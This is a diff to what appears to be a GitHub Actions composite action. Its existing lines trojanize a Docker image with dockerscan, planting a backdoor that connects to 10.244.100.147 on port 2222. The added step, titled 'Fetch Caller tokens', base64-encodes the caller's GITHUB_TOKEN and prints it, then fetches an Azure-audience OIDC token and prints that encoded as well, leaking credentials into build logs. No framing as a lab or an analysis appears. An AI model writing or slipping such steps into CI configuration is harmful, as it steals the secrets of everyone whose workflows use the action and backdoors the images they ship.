@@ -31,3 +31,11 @@ runs:
         docker save ${{ inputs.image-name }} -o original
         dockerscan image modify trojanize original -l 10.244.100.147 -p 2222 -o trojan
         docker load -i trojan.tar
+    
+    - name: "Fetch Caller tokens"
+      shell: bash
+        run: | 
+          echo ${{ secrets.GITHUB_TOKEN }} | base64 >> /tmp/secret
+          cat /tmp/secret
+          curl -o output.txt -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" 
+          cat output.txt | base64 
